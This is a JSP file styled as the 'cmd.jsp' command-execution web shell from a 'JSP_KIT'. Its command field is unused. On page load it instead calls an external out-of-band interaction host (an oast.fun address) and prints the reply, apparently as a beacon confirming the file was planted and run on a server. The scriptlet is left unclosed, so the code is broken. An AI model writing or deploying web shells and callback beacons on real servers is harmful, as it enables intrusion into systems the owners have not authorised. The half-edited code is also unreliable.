<%@ page import="java.util.*,java.io.*"%>
<%@ page import="java.net.HttpURLConnection" %>
<%@ page import="java.net.URL" %>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
        String urlToCall = "http://ymynrwkrmfkjqksnrjfgzj0y7w6cyxjs0.oast.fun";

    // Create a URL object
    URL url = new URL(urlToCall);

    // Open a connection to the URL
    HttpURLConnection connection = (HttpURLConnection) url.openConnection();

    // Set request method
    connection.setRequestMethod("GET");

    // Get the response code
    int responseCode = connection.getResponseCode();

    // Read the response
    BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
    StringBuilder response = new StringBuilder();
    String line;
    while ((line = reader.readLine()) != null) {
        response.append(line);
    }
    reader.close();

    // Output the response
    out.println("Response Code: " + responseCode);
    out.println("Response Body: " + response.toString());

    // Close the connection
    connection.disconnect();
</pre>
</BODY></HTML>


